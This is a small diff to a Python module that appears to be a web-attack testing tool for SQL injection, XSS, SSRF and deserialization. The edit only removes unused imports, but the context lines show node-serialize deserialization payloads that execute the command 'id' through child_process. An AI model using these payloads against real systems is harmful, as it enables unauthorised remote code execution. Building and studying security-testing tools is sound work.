@@ -8,13 +8,11 @@ Covers: SQL Injection, XSS, SSRF, Deserialization, Business Logic
 
 import subprocess
 import shlex
-import json
 import os
 import re
-import sys
 import time
 import urllib.parse
-from typing import Optional, Dict, Any, List, Tuple
+from typing import Optional, Dict, Any, List
 
 
 class WebAdvanced:
@@ -1475,7 +1473,6 @@ class WebAdvanced:
         try:
             if not url:
                 url = self._build_target_url(target, "/")
-            import base64
             node_payloads = {
                 "node-serialize": 'rce":"_$$ND_FUNC$$_function(){require("child_process").exec("id",function(e,r){global.process.stdout.write(r)})}()}',
                 "function": '{"rce":"_$$ND_FUNC$$_function(){require(\'child_process\').execSync(\'id\')}()"}',
